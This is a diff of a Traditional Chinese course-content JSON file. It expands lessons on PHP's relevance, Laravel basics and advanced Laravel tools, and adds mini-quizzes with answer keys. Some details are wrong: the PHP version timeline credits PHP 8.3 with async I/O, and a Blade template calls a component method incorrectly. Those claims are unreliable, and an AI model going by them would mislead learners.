@@ -24,7 +24,7 @@
       "title": "PHP 在 2026 仍重要",
       "oneLineSummary": "WordPress 占 43% 網站、Laravel 是現代化",
       "analogy": "不時髦但有市場。",
-      "content": "## PHP 現狀\n- WordPress：43% 全網\n- Laravel：現代 PHP 框架\n- 衰退中但仍大量 legacy\n- 求職市場存在\n\n## PHP 8.3 特性\n不再是 2010 的 PHP：\n- 強型別\n- Enum\n- Readonly properties\n- First-class callable\n- 性能進步\n\n```php\nenum Status: string {\n    case Active = 'active';\n    case Inactive = 'inactive';\n}\n\nclass User {\n    public function __construct(\n        public readonly string $email,\n        public readonly Status $status\n    ) {}\n}\n```\n\n## Laravel vs Symfony\n\n### Laravel\n- 簡單、易用\n- 文件好\n- 中小型專案首選\n- 生態完整\n\n### Symfony\n- 企業級\n- 模組化\n- Drupal 用\n- 學習曲線陡\n\n99% 場景 Laravel。\n\n## 為什麼選 PHP\n\n### ✅ 適合\n- WordPress 接案（大市場）\n- Laravel SaaS\n- 維護 legacy\n- 小團隊 / Indie 快速 ship\n\n### ❌ 不適合\n- 重 realtime\n- 高並發（不如 Go）\n- 全棧 TS 一致\n\n## 跟 Node 比\n\n| 面向 | PHP / Laravel | Node |\n|---|---|---|\n| 學習 | 平 | 平 |\n| 生態 | 大 | 巨 |\n| 招募 | 多但跌 | 多且增 |\n| 全棧 | PHP 後端 + JS 前端 | 全 JS |\n| 部署 | 簡單（傳統 hosting）| 中 |\n| 性能 | 中 | 中-高 |\n\n## 心法\n- WordPress 是另一個世界（看 Ch37）\n- Laravel 是現代 PHP 的代表\n- 不要為時髦放棄、市場需求大\n- Indie 接案 = WordPress 飯碗\n\n**☕ 用人話講**\n\nPHP 在 2026 仍重要——**WordPress 佔了全球 43% 的網站、Laravel 是它的現代化代表**。**一句話記住**：PHP 像「還在穩穩跑的老引擎」——雖然不潮，但全球將近一半的網站靠它，相關案子接不完。\n",
+      "content": "## PHP 在 2026 仍重要\n\n### 為什麼這課重要\n\n很多人看到「PHP 已死」的標題就直接放棄，結果錯過了**全球最大的web工作市場**。這課要讓你看清真相：PHP 不是最炫的語言，但它養活了全球超過一千萬的開發者、掌控了網路上將近一半的網站。選它，不是因為時髦，而是因為**現實**。\n\n---\n\n## PHP 現況：衰退是假象、市場是真實\n\n### 數字會說話\n\n**WordPress：43% 全球網站** —— 這不是在唬爛。如果你今天去排名前一百萬的網站裡隨便點十個，將近四個跑的是 WordPress。WordPress 的核心是 PHP，而且 WordPress 生態包含外掛、佈景主題——這是個**龐大的金礦**。\n\n每個中小企業、部落客、小店家，有 WordPress 就有 PHP。相比之下，JavaScript 技術棧再火，也搶不走這塊市場——因為老闆根本不在乎你用的是什麼技術，只在乎網站能不能動。\n\n**招募市場仍大，但成長趨勢確實在跌**。言外之意：PHP 工作機會很多，但求職者競爭沒那麼激烈、薪資也更穩定。這對新手反而是優勢。\n\n### 為什麼會有「PHP 已死」的說法\n\n- **2010 年代的 PHP**：當時寫得就像砌磚頭，沒有型別、沒有現代化工具、bug 多到爆\n- **框架碎片化**：曾經同時有 CodeIgniter、CakePHP、Zend 框架，大家都在重新造輪子\n- **Node.js 的衝擊**：JavaScript 統一了前後端，新創公司搞全棧 JavaScript 爽，媒體就跟著吹\n\n但這些都是**過去式**。現在的 PHP 8.3+ 根本是另一個東西。\n\n---\n\n## PHP 8.3：已經不是 2010 的語言了\n\n### 強型別 —— 再也不是亂來的年代\n\n**強型別（Type hints）** —— 在變數、參數、回傳值上明確寫下「這是什麼型態」。\n\n以前的 PHP：\n\n```php\nfunction add($a, $b) {\n    return $a + $b;\n}\n\necho add(5, \"10\");  // 結果 15、沒警告、但你根本不知道發生什麼\n```\n\n現在的 PHP 8.3：\n\n```php\nfunction add(int $a, int $b): int {\n    return $a + $b;\n}\n\necho add(5, 10);     // ✅ 結果 15\necho add(5, \"10\");   // ❌ TypeError：預期 int、傳入 string\n```\n\n**為什麼重要**？你寫的程式能自己檢查自己，少一半的 bug。這就像把「防守」內建在語言裡。\n\n### Enum —— 安全的選項清單\n\n**Enum（列舉）** —— 用來定義「只能是這幾個固定值」的狀態。\n\n想像你在做電商平台，訂單狀態只能是「待審、已發、已到、已完成」，不能有第五種。以前的做法：\n\n```php\n$status = \"active\";  // 或者 \"actibe\"（打錯字了、沒人發現）\n```\n\nEnum 的做法：\n\n```php\nenum OrderStatus: string {\n    case Pending = 'pending';\n    case Shipped = 'shipped';\n    case Delivered = 'delivered';\n    case Completed = 'completed';\n}\n\n$order = new Order(\n    status: OrderStatus::Shipped\n);\n\n// 👉 type checking + IDE 自動完成、根本不可能打錯\n```\n\n好處：**型別檢查、IDE 提示、程式碼自己文件化**。\n\n### Readonly Properties —— 一次定、不再改\n\n**Readonly（唯讀屬性）** —— 一個欄位在建構時設定後，就永遠不能改。\n\n```php\nclass User {\n    public function __construct(\n        public readonly string $email,\n        public readonly Status $status\n    ) {}\n}\n\n$user = new User(\n    email: \"alice@example.com\",\n    status: Status::Active\n);\n\n// ✅ 可以讀\necho $user->email;\n\n// ❌ 不能改（PHP 會丟 Error）\n$user->email = \"bob@example.com\";\n```\n\n**為什麼有用**？很多時候資料就是不應該被改動（比如使用者的建檔日期、ID）。Readonly 讓你在設計層面就鎖死它，省去一堆防守程式碼。\n\n### First-class Callable —— 函式當作一級公民\n\n這個比較進階，簡單說就是「可以把函式本身當作物件來傳遞」，不用再寫複雜的 closure 語法。如果現在看不懂沒關係，進階再學。\n\n### 性能提升\n\nPHP 8.0→8.3 性能整體快了 **15~30%**，有些操作快到 2 倍。不是革命等級，但日積月累下來，你的服務器月租可以省一筆。\n\n---\n\n## Laravel vs Symfony：市場現狀\n\n### Laravel：實戰首選\n\n**Laravel** 是「面向人的框架」。\n\n```php\n// 路由（URL 到函式的映射）\nRoute::get('/users/{id}', function ($id) {\n    return User::find($id);\n});\n\n// 就這麼簡單、讀起來幾乎像英文\n```\n\n**為什麼用 Laravel**：\n- 官方文件清楚、社群大、Stack Overflow 什麼都有\n- 「約定優於設定」—— 框架替你決定 80% 的結構、你只需要填空白\n- 工具完整：資料庫遷移、認證、API、隊列、排程、全部內建\n- 適合**中小型專案、SaaS、創業公司**\n\n**求職視角**：Laravel 開發者職位最多、薪資也還不錯。\n\n### Symfony：企業怪獸\n\n**Symfony** 是「給大團隊用的框架」。\n\n- 高度模組化：每個元件都能獨立用在其他專案\n- 學習曲線陡：文件更複雜、需要搞清楚「依賴注入」等企業級概念\n- 被用在 Drupal（內容管理怪獸）\n- **適合大型企業、需要高度客製的專案**\n\n**現實情況**：99% 的新手和小公司會選 Laravel。Symfony 是「如果你的問題大到 Laravel 搞不定、就該考慮它」的選項。\n\n---\n\n## 為什麼選 PHP（或說什麼時候別選）\n\n### ✅ PHP/Laravel 超適合的場景\n\n**WordPress 接案** —— 全球最簡單的「外包一個網站」市場。老闆要網站、你裝 WordPress + 改佈景主題 + 寫幾個 custom plugin，成本低、交期短、利潤還不錯。**獨立接案者的主食**。\n\n**Laravel SaaS** —— 自己做 Software-as-a-Service（比如 Slack、Notion 這種）。Laravel 快、工具全、部署簡單，很適合創業團隊 MVP（最小可行品）快速上市。\n\n**維護 Legacy** —— 全球有數百萬個舊 PHP 系統跑在生產環境，沒人想碰但又不能不改。懂 PHP 的人少了，反而變得值錢。\n\n**小團隊 / Indie 快速 ship** —— 一個人要做前後端？PHP + Laravel 搭 JavaScript（前端）最平衡。從構想到上線，時間最短。\n\n### ❌ PHP 不適合的場景\n\n**重實時性**（Real-time）—— 比如線上遊戲、即時協作（Google Docs 那種）。PHP 每個請求是獨立的、沒有持久連線，實時推送要另外裝 WebSocket 伺服器（有點麻煩）。Node.js 或 Go 原生更順。\n\n**極高並發**（Concurrency）—— 假設你的網站突然有 10 萬人同時在線。PHP 架構上就是「每個請求起一個行程」，到一定規模就很吃資源。Go 或 Rust 能用更少資源撐更多連線。\n\n**全棧 TypeScript 一致性** —— 如果你執著「整個公司都用 TypeScript、統一型別系統」，那 Node 全棧會更爽。PHP 前端還是 JavaScript、後端是 PHP，概念上分開了。\n\n---\n\n## PHP vs Node.js：一張表看清\n\n| 面向 | PHP / Laravel | Node.js |\n|---|---|---|\n| **學習難度** | 平均 | 平均 |\n| **生態套件** | 大（但不如 npm） | 巨 |\n| **招募市場** | 多、但成長跌 | 多、且持續增 |\n| **全棧一致性** | PHP 後端 + JS 前端 | 全 JavaScript |\n| **部署** | 簡單（放虛擬主機就動） | 中等（通常需要 Docker / CI-CD） |\n| **性能** | 中（足夠大多數業務） | 中~高 |\n| **學習資源** | 豐富（很多中文） | 超豐富 |\n| **初創適配度** | 高（快、便宜） | 高（靈活、擴展性強） |\n\n**結論**：沒有絕對贏家，看你的優先序。想快速賺錢？PHP。想做最先進的技術棧？Node。\n\n---\n\n## PHP 選擇的心法\n\n**1. WordPress 是另一個世界** —— 不在這課範圍，看進階章節。但懂 WordPress 的 PHP 開發者年薪 6 位數起跳，這是事實。\n\n**2. Laravel 是現代 PHP 的代表** —— 如果你決定學 PHP，就學 Laravel。不",
       "tip": {
         "type": "practical",
         "text": "PHP 不時髦但有飯吃。WordPress 是最大市場。"
@@ -87,7 +87,30 @@
           "level": 2,
           "text": "心法"
         }
-      ]
+      ],
+      "miniQuiz": {
+        "question": "根據這堂課，為什麼 PHP 在 2026 年仍然重要？哪個選項最能代表課程的核心觀點？",
+        "options": [
+          {
+            "value": "a",
+            "label": "WordPress 佔全球 43% 網站，加上 Laravel 的現代化框架，市場需求仍大，接案機會多"
+          },
+          {
+            "value": "b",
+            "label": "PHP 8.3 的新特性（強型別、Enum 等）已經完全趕上 Node.js 的性能"
+          },
+          {
+            "value": "c",
+            "label": "PHP 是全棧開發最好的選擇，應該完全取代 JavaScript 做前後端"
+          },
+          {
+            "value": "d",
+            "label": "Symfony 比 Laravel 更容易學，所以 PHP 開發者需求會增加"
+          }
+        ],
+        "answer": "a",
+        "explanation": "課程強調 PHP 不是因為很潮，而是因為 WordPress 市場龐大（43%）且有大量 legacy 代碼要維護，Laravel 則是現代 PHP 的代表，整體生態和接案機會都很實際。b 誇大了 PHP 的性能追趕；c 忽視了 Node.js 在全棧 TS 的優勢；d 與課程內容相反（Laravel 才是 99% 首選）。"
+      }
     },
     {
       "title": "Laravel 起步 + Eloquent ORM",
@@ -156,13 +179,36 @@
           "level": 2,
           "text": "心法"
         }
-      ]
+      ],
+      "miniQuiz": {
+        "question": "在 Laravel 中，如果你想在取出文章列表時，同時載入每篇文章的作者和評論資料，避免 N+1 查詢問題，應該用下列哪個方法？",
+        "options": [
+          {
+            "value": "a",
+            "label": "Post::get() 然後在迴圈裡逐個呼叫 $post->user 和 $post->comments"
+          },
+          {
+            "value": "b",
+            "label": "Post::with('user', 'comments')->get()"
+          },
+          {
+            "value": "c",
+            "label": "Post::where('user_id', '!=', null)->get()"
+          },
+          {
+            "value": "d",
+            "label": "Post::load('user')->load('comments')->get()"
+          }
+        ],
+        "answer": "b",
+        "explanation": "with() 在查詢時就一次載入關聯資料，避免 N+1 問題。選項 a 會導致額外查詢，d 的 load() 是用在已取得的模型上，不是在查詢階段使用。"
+      }
     },
     {
       "title": "Laravel 進階 + 接案變現",
       "oneLineSummary": "Livewire / Inertia / 部署 / 接案",
       "analogy": "台灣 PHP 接案仍有需求。",
-      "content": "## Livewire（PHP 寫 SPA）\n不用 JS、用 PHP 寫互動 UI：\n```php\nclass Counter extends Component\n{\n    public $count = 0;\n    \n    public function increment()\n    {\n        $this->count++;\n    }\n    \n    public function render()\n    {\n        return view('livewire.counter');\n    }\n}\n```\n\n```blade\n<div>\n    <h1>{{ $count }}</h1>\n    <button wire:click=\"increment\">+</button>\n</div>\n```\n\n點 button → server roundtrip → 自動更新 UI。\n適合：admin / 表單、不適合：高互動。\n\n## Inertia.js（Vue / React + Laravel）\nSPA 體驗、Laravel 後端：\n```php\npublic function index()\n{\n    return Inertia::render('Posts/Index', [\n        'posts' => Post::all()\n    ]);\n}\n```\n\n```vue\n<template>\n  <Layout>\n    <h1>Posts</h1>\n    <div v-for=\"post in posts\">{{ post.title }}</div>\n  </Layout>\n</template>\n\n<script setup>\ndefineProps({ posts: Array });\n</script>\n```\n\n最佳組合：Laravel + Inertia + Vue / React。\n\n## Laravel Octane\n用 Swoole / RoadRunner 跑：\n```bash\ncomposer require laravel/octane\nphp artisan octane:install\nphp artisan octane:start\n```\n\n性能快 10 倍、適合 high-traffic。\n\n## Filament（admin panel）\n1 行裝 admin 後台：\n```bash\ncomposer require filament/filament\nphp artisan filament:install --panels\nphp artisan make:filament-resource Post\n```\n\n得到完整 CRUD admin、超快。\n\n## 部署\n\n### 傳統（虛擬主機）\n- cPanel / Plesk\n- SFTP 上傳\n- 每月 NT$ 200-500\n- 適合：小流量\n\n### VPS\n- DigitalOcean / Linode\n- 自己裝 Nginx / PHP-FPM\n- 月 $5-20\n\n### Laravel Forge\n- 自動化 VPS 設定\n- 月 $12\n- Push to deploy\n\n### Vapor\n- Laravel 出的 serverless\n- AWS Lambda\n- 自動 scale\n\n### Railway / Fly.io\n也支援 PHP。\n\n## 接案市場（台灣 2026）\n\n### WordPress\n- 小型網站：NT$ 10-100k\n- 客製：NT$ 100-500k\n- 月維護：NT$ 1-10k\n\n### Laravel\n- SaaS 從 0：NT$ 200k-2M\n- 客製 ERP：NT$ 500k-5M\n- 維護：NT$ 10-50k/月\n\n### 招募\n- Junior PHP：NT$ 50-80k\n- Mid：NT$ 70-100k\n- Senior：NT$ 100-150k\n\nPHP 工程師比 Node 便宜（市場供給多）。\n\n## Indie SaaS\n\n### 用 Laravel 適合\n- B2B SaaS\n- 內部工具\n- 中小企業客戶\n- 快速 MVP\n\n### 不適合\n- 高互動 SPA\n- 行動 App backend\n- 即時 / WebSocket-heavy\n\n## 名作品 Laravel\n- Laracasts（教學平台）\n- Statamic（CMS）\n- Beam（client portal）\n- October CMS\n\n## 心法\n- WordPress 是飯碗、Laravel 是進階\n- 接案：WordPress 多、Laravel 大案\n- Indie SaaS：Laravel 比 Node 簡單\n- Filament + Livewire = Indie 神器\n\n## 學習路徑\n1. PHP 基礎\n2. Laravel\n3. Eloquent + Migration\n4. Auth (Sanctum)\n5. Queue / Job\n6. Filament（admin）\n7. 部署（Forge / VPS）\n8. 接案 / SaaS\n\n**☕ 用人話講**\n\nLaravel 進階 + 接案變現——Livewire / Inertia / 部署 / 接案。**一句話記住**：像把手藝練到能接案的程度——學會 Laravel 進階主題，再懂怎麼報價交付，就能變現。\n",
+      "content": "## Laravel 進階 + 接案變現\n\n### 為什麼要學 Laravel 進階\n\n你現在已經會寫基礎 Laravel 了——model、controller、route、database 都摸過。但如果要真的拿出來接案、或自己做 SaaS，還差一步：怎麼寫出「互動流暢」的網站、怎麼部署到線上、怎麼報價。這一課就是填那個坑。\n\n---\n\n## Livewire（PHP 寫互動 UI —— 不用碰 JavaScript）\n\n### 核心概念：伺服器驅動的即時互動\n\nLivewire 是 Laravel 生態裡的神器。正常寫網頁，互動都要用 JavaScript（React、Vue）。但 Livewire 讓你在 PHP 裡寫邏輯，前端自動綁定，點一下按鈕就自動往返伺服器更新 UI。\n\n**生活比喻**：就像你遠端控制家裡冷氣——按下手機按鈕（wire:click），信號傳給冷氣機（伺服器），冷氣改變狀態，狀態同步回手機畫面。\n\n### 完整例子：購物車計數器\n\n📄 app/Livewire/CartCounter.php\n```php\nnamespace App\\Livewire;\n\nuse Livewire\\Component;\n\nclass CartCounter extends Component\n{\n    public $count = 0;      // 狀態變數\n    public $price = 100;    // 每個商品 NT$ 100\n    \n    public function increment()\n    {\n        $this->count++;\n        // 更新自動同步到前端（無需寫 API）\n    }\n    \n    public function decrement()\n    {\n        if ($this->count > 0) {\n            $this->count--;\n        }\n    }\n    \n    public function getTotalPrice()\n    {\n        return $this->count * $this->price;\n    }\n    \n    public function render()\n    {\n        return view('livewire.cart-counter');\n    }\n}\n```\n\n📄 resources/views/livewire/cart-counter.blade.php\n```blade\n<div class=\"cart-widget\">\n    <h2>購物車</h2>\n    \n    <div class=\"count-display\">\n        商品數：<strong>{{ $count }}</strong>\n    </div>\n    \n    <div class=\"controls\">\n        <button wire:click=\"decrement\" class=\"btn btn-sm\">−</button>\n        <button wire:click=\"increment\" class=\"btn btn-sm\">+</button>\n    </div>\n    \n    <div class=\"price\">\n        總價：NT$ <strong>{{ getTotalPrice() }}</strong>\n    </div>\n</div>\n```\n\n**動作流程**：\n1. 使用者點「+」按鈕\n2. Livewire 攔截 wire:click 事件\n3. 傳到伺服器，執行 `increment()` 方法\n4. `$count` 增加\n5. 自動重算 `getTotalPrice()`\n6. 伺服器傳回新 HTML（只更新變化部分）\n7. 前端無痛更新（沒有寫任何 JavaScript）\n\n### 何時用 Livewire、何時不用\n\n**適合用**：\n- 後台管理界面（admin panel）\n- 表單驗證（邊填邊檢查）\n- 動態篩選列表\n- 小規模互動\n\n**不適合用**：\n- 高頻率互動（每秒多次點擊）—— 網路往返太多\n- 複雜動畫 —— JavaScript 還是比較順\n- 行動 App 前端 —— 網路延遲明顯\n\n### 常見雷：效能問題\n\nLivewire 每次互動都要 server roundtrip（往返一趟伺服器）。如果你做一個「滑鼠移動就更新」的功能，使用者滑鼠一動 100 次、就送 100 個請求，伺服器會爆掉。所以記住：**Livewire 適合「用戶主動」的互動（按鈕、表單），不適合「持續」互動**。\n\n---\n\n## Inertia.js（Vue / React + Laravel —— SPA 體驗）\n\n### 核心概念：後端就是後端，前端就是前端\n\nLivewire 是「PHP 包一切」，Inertia.js 反過來——後端就寫 Laravel（API 邏輯），前端就寫 Vue / React（UI 邏輯），兩邊各司其職，但零 API 文件、無縫整合。\n\n**好比**：Livewire 像是「遠端控制」，Inertia 像是「操作面板 + 真正的機械分開設計」。\n\n### 完整例子：文章列表 + 新增\n\n📄 app/Http/Controllers/PostController.php\n```php\nnamespace App\\Http\\Controllers;\n\nuse App\\Models\\Post;\nuse Inertia\\Inertia;\n\nclass PostController extends Controller\n{\n    public function index()\n    {\n        return Inertia::render('Posts/Index', [\n            'posts' => Post::all()->map(fn($p) => [\n                'id' => $p->id,\n                'title' => $p->title,\n                'content' => $p->content,\n            ]),\n        ]);\n    }\n    \n    public function store(Request $request)\n    {\n        $post = Post::create([\n            'title' => $request->title,\n            'content' => $request->content,\n        ]);\n        \n        return to_route('posts.index')\n            ->with('message', '文章新增成功！');\n    }\n}\n```\n\n📄 resources/js/Pages/Posts/Index.vue\n```vue\n<template>\n  <Layout>\n    <h1>文章列表</h1>\n    \n    <!-- 新增表單 -->\n    <form @submit.prevent=\"submit\" class=\"mb-4\">\n      <input \n        v-model=\"form.title\" \n        placeholder=\"標題\"\n        type=\"text\"\n      />\n      <textarea \n        v-model=\"form.content\" \n        placeholder=\"內容\"\n      ></textarea>\n      <button type=\"submit\">新增</button>\n    </form>\n    \n    <!-- 列表 -->\n    <div class=\"posts-list\">\n      <div v-for=\"post in posts\" :key=\"post.id\" class=\"post-card\">\n        <h2>{{ post.title }}</h2>\n        <p>{{ post.content }}</p>\n      </div>\n    </div>\n  </Layout>\n</template>\n\n<script setup>\nimport { useForm } from '@inertiajs/vue3';\nimport Layout from '@/Layouts/AppLayout.vue';\n\ndefineProps({ posts: Array });\n\nconst form = useForm({\n  title: '',\n  content: '',\n});\n\nconst submit = () => {\n  form.post(route('posts.store'));\n};\n</script>\n```\n\n**動作流程**：\n1. 使用者填表、按提交\n2. Vue 攔截提交、驗證\n3. 送 POST 到 Laravel 後端\n4. Laravel 儲存資料、回傳重導信號\n5. Vue 自動重新整頁（Inertia 智能只刷新變化部分）\n6. 列表自動更新，不需要寫 API 文件\n\n### Livewire vs Inertia：怎麼選\n\n| 面向 | Livewire | Inertia |\n|------|----------|---------|\n| 學習曲線 | 簡單（還是 PHP） | 中等（要學 Vue） |\n| 互動體驗 | 還可以，但有延遲 | 順暢（SPA 感覺） |\n| 複雜 UI | 不適合 | 超適合 |\n| 新手友善 | ✅ | ❌ |\n\n**實戰建議**：新手先學 Livewire（快上手）；做到一定規模、互動變複雜了，再改 Inertia + Vue。\n\n---\n\n## Laravel Octane（跑更快的 Laravel —— 10 倍速）\n\n### 核心概念：不重啟 PHP，常駐記憶體\n\n正常 Laravel 每個請求都要啟動一次 PHP 進程、載入框架、執行邏輯、結束。這叫「沒有預熱」。Octane 用 Swoole（非同步引擎）讓 Laravel 進程常駐在記憶體，請求來了直接用，不用每次都重新開機。\n\n**比喻**：就像冷氣機——正常 PHP 是「用一次買一台、用完丟掉」，Octane 是「開機一次，常駐開著」。\n\n### 安裝 + 啟動\n\n🖥️ 終端\n```bash\ncomposer require laravel/octane\n\n# 選 Swoole 或 RoadRunner（Swoole 更快，但需 PECL）\nphp artisan octane:install\n\n# 確認安裝\nphp artisan octane:start\n```\n\n💬 輸出（成功）\n```\n  _____                 ___\n / _ \\ |_|_____ _      |_ |\n| | | || \\\\___  | |\\ || |\\/|\n| |_| || | | | | | \\ || |  |\n \\___/ |_| |_| |_|  \\_||_|\n\nOctane server running on [http://127.0.0.1:8000]\n```\n\n立刻速度提升 10 倍。\n\n### 何時該用 Octane\n\n**用 Octane**：\n- 網站流量大（每秒 100+ 請求）\n- 要求低延遲\n- SaaS / 平台類產品\n\n**不用 Octane**：\n- 小流量網站\n- 傳統虛擬主機（不支援 Octane）\n- 初學者（先精 Laravel，再優化速度）\n\n---\n\n## Filament（後台管理系統 —— 1 行裝 admin）\n\n### 核心概念：零程式碼快速生成 CRUD 介面\n\n後台管理永遠是網站必需。寫一個「商品管理、使用者管理、訂單查詢」的後台，通常要花一週。Filament 讓你一行指令、幾分鐘搞定。\n\n### 快速開始\n\n🖥️ 終端\n```bash\ncomposer require filament/filament\nphp artisan filament:install --panels\nphp artisan make:filament-resource Post\n```\n\n這樣會自動生成：\n- `/admin` 後台入口\n- Post model 的完整 CRUD（新增、編輯、刪除、篩選、排序）\n- 漂亮的 UI（Tailwind 設計）",
       "tip": {
         "type": "milestone",
         "text": "Laravel + Filament = Indie SaaS 快速 ship。"
@@ -265,13 +311,36 @@
           "level": 2,
           "text": "學習路徑"
         }
-      ]
+      ],
+      "miniQuiz": {
+        "question": "根據這堂課的內容，如果你要接一個「中小企業的進銷存系統」案子，用 Laravel 搭配什麼工具組合最有效率？",
+        "options": [
+          {
+            "value": "a",
+            "label": "Laravel + Livewire + Filament"
+          },
+          {
+            "value": "b",
+            "label": "Laravel + Inertia + Vue 搭 React"
+          },
+          {
+            "value": "c",
+            "label": "Laravel + Octane + Swoole"
+          },
+          {
+            "value": "d",
+            "label": "Laravel + Vapor + AWS Lambda"
+          }
+        ],
+        "answer": "a",
+        "explanation": "Filament 是快速建 admin 後台的工具，Livewire 適合表單互動，兩者組合最適合中小企業的後台系統。Inertia+Vue 適合高互動 SPA，Octane 和 Vapor 主要是性能/部署優化，不是開發效率的主要考量。"
+      }
     },
     {
       "title": "Laravel：PHP 框架王者",
       "oneLineSummary": "PHP 還活著、Laravel 是現代代表",
       "analogy": "台灣接案 PHP 主流、企業 / 中小公司多。",
-      "content": "## PHP 仍重要\n\n### 為什麼\n- WordPress 全球 40% 網站\n- 共享主機便宜 / 廣\n- 老系統維護\n- Laravel 現代化\n\n### Laravel\n- PHP 最熱框架\n- 設計優雅\n- Eloquent ORM 棒\n- 生態完整\n\n## Hello Laravel\n\n```bash\ncomposer create-project laravel/laravel myapp\ncd myapp\nphp artisan serve\n```\n\n### Route\n```php\n// routes/web.php\nRoute::get('/hello', function () {\n    return 'Hello, World!';\n});\n\n// routes/api.php\nRoute::get('/users/{id}', [UserController::class, 'show']);\n```\n\n### Controller\n```php\nclass UserController extends Controller\n{\n    public function show($id) {\n        $user = User::findOrFail($id);\n        return response()->json($user);\n    }\n}\n```\n\n### Eloquent Model\n```php\nclass User extends Model\n{\n    protected $fillable = ['email', 'name'];\n    \n    public function posts() {\n        return $this->hasMany(Post::class);\n    }\n}\n\n// 用\n$user = User::find(1);\n$posts = $user->posts;\n```\n\n### Migration\n```bash\nphp artisan make:migration create_users_table\n```\n\n```php\npublic function up()\n{\n    Schema::create('users', function (Blueprint $table) {\n        $table->id();\n        $table->string('email')->unique();\n        $table->string('name');\n        $table->timestamps();\n    });\n}\n```\n\n```bash\nphp artisan migrate\n```\n\n## Laravel 全套\n\n### Auth\n```bash\ncomposer require laravel/breeze\nphp artisan breeze:install\n```\n登入 / 註冊 / 重設密碼 全有。\n\n### Queue\n```php\ndispatch(new SendEmailJob($user));  // 排隊處理\n```\n\n### Scheduler（cron）\n```php\n$schedule->command('reports:generate')->dailyAt('00:00');\n```\n\n### Notifications\n```php\n$user->notify(new InvoicePaid($invoice));\n```\n\n### 多 channel：Email / SMS / Slack / DB\n\n## 心法\n- Laravel 是 PHP 接案神器\n- 5 倍速度做完事\n- 適合：中型 SaaS / 接案\n- WordPress 仍主流但 Laravel 接案更賺\n- 學習曲線中（PHP 熟 → 1 個月上手）\n\n**☕ 用人話講**\n\nLaravel——**PHP 框架的王者**：PHP 還活著，而 Laravel 是它的現代代表。**一句話記住**：如果 PHP 是老牌餐廳，Laravel 就是它的米其林新菜單——讓這個老語言寫起來現代又優雅。\n",
+      "content": "## PHP 仍然重要——2024 年為什麼還在用？\n\n### 為什麼 PHP 沒死？\n\n你可能聽過「PHP 已死」這種言論，但事實完全相反。讓我們看看數字：\n\n**市場現狀**\n- WordPress 驅動全球 43% 的網站（超過 6 億個網站）\n- Facebook、Slack、WordPress.com 的核心都用 PHP 寫\n- 全球伺服器上 77% 的網站用 PHP（根據 W3Techs 統計）\n- 共享主機便宜、跑遍世界每個廉價空間\n\n**為什麼企業還在用**\n- **舊系統維護**：十年前寫的購物網、會員系統，從來沒人敢全部砍掉重寫，因為風險太大\n- **WordPress 生態**：WooCommerce、Plugin 外掛幾十萬個，用戶就靠這個活著\n- **學習成本低**：學過一個 PHP 框架，換到另一個很快就上手\n- **部署超簡單**：租個虛擬主機，上傳檔案就跑，不用玩容器、雲端架構\n\n**為什麼它進化了**\nPHP 從 5.3 版開始，越來越現代化。來看看時間軸：\n- PHP 5.6（2014）：命名空間、自動載入器出現\n- PHP 7.0（2015）：型別提示、速度快 2 倍\n- PHP 8.0（2020）：JIT 編譯、屬性（Attributes）、命名參數\n- PHP 8.3（2023）：只讀類別、非同步 I/O\n\n所以 PHP 不是老古董——**它在進化，只是進化得很低調**。\n\n### Laravel：這是什麼怪物？\n\nLaravel 是 2011 年由 Taylor Otwell 創造的 PHP 框架，現在是 PHP 生態裡最活躍、最受歡迎的框架。\n\n**為什麼叫「框架王者」？**\n- **設計哲學美**：Laravel 不是「最快」，而是「最舒服」。它預設幫你想好常見問題的解法\n- **Eloquent ORM**：這是一個物件關係映射（Object-Relational Mapping）工具——簡單說就是「讓你寫 PHP 物件而不是 SQL」\n- **生態完整到爆**：Sanctum（API 認證）、Queue（任務隊列）、Scheduler（定時工作）、Notification（通知）、Broadcasting（即時推送），全部包在裡面\n- **Laravel Ecosystem**：Vapor（無伺服器部署）、Forge（自動化部署工具）、Horizon（Queue 視覺化）——圍繞它形成了一整個產業鏈\n\n用 Laravel 開發，一個人可以在 2 週內做出來的東西，用原始 PHP 可能要 2 個月。\n\n---\n\n## Hello Laravel——實際走一遍\n\n### 你的第一個 Laravel 專案\n\n**前置條件**：電腦上要有 PHP 8.0+ 和 Composer（PHP 的套件管理器）。\n\n🖥️\n```bash\ncomposer create-project laravel/laravel myapp\ncd myapp\nphp artisan serve\n```\n\n💬\n```\nLocal:   http://127.0.0.1:8000\n```\n\n打開瀏覽器，看到漂亮的 Laravel 歡迎頁——你成功了！\n\n**這些指令在做什麼？**\n- `composer create-project`：下載 Laravel 框架、裝好所有依賴套件\n- `php artisan serve`：啟動內置開發伺服器。`artisan` 是 Laravel 的魔法棒，所有指令都從它出發\n\n### Route（路由）——告訴 Laravel「哪個 URL 該做什麼」\n\n想像路由是餐廳的菜單。客人說「我要番茄湯」，廚房就知道怎麼做。\n\n📄 `routes/web.php`\n```php\n// 最簡單的路由\nRoute::get('/hello', function () {\n    return 'Hello, World!';\n});\n\n// 帶參數的路由\nRoute::get('/users/{id}', function ($id) {\n    return \"User ID: \" . $id;\n});\n\n// 指派給 Controller 的路由（通常用這個）\nRoute::get('/users/{id}', [UserController::class, 'show']);\nRoute::post('/users', [UserController::class, 'store']);\nRoute::put('/users/{id}', [UserController::class, 'update']);\nRoute::delete('/users/{id}', [UserController::class, 'destroy']);\n```\n\n📄 `routes/api.php`\n```php\n// API 路由通常放這裡（自動加上 /api 前綴）\nRoute::get('/users/{id}', [UserController::class, 'show']);\n// 實際 URL: http://localhost:8000/api/users/1\n```\n\n**為什麼要分 web.php 和 api.php？**\n- `web.php`：回傳網頁（HTML）、有 CSRF 保護、支援 Cookie 登入\n- `api.php`：回傳 JSON、用 Token（API key）認證、給手機 App 或前端框架用\n\n### Controller（控制器）——邏輯大腦\n\nController 是接收請求、做事情、回傳結果的地方。\n\n🖥️\n```bash\nphp artisan make:controller UserController\n```\n\n📄 `app/Http/Controllers/UserController.php`\n```php\nnamespace App\\Http\\Controllers;\n\nuse App\\Models\\User;\nuse Illuminate\\Http\\Request;\n\nclass UserController extends Controller\n{\n    // 顯示單一使用者\n    public function show($id) {\n        $user = User::findOrFail($id);  // 找不到就拋 404 例外\n        return response()->json($user);\n    }\n    \n    // 新增使用者\n    public function store(Request $request) {\n        $validated = $request->validate([\n            'name' => 'required|string|max:255',\n            'email' => 'required|email|unique:users',\n            'password' => 'required|min:8',\n        ]);\n        \n        $user = User::create($validated);\n        return response()->json($user, 201);  // 201 = 建立成功\n    }\n    \n    // 更新使用者\n    public function update(Request $request, $id) {\n        $user = User::findOrFail($id);\n        $user->update($request->validate([\n            'name' => 'string|max:255',\n            'email' => 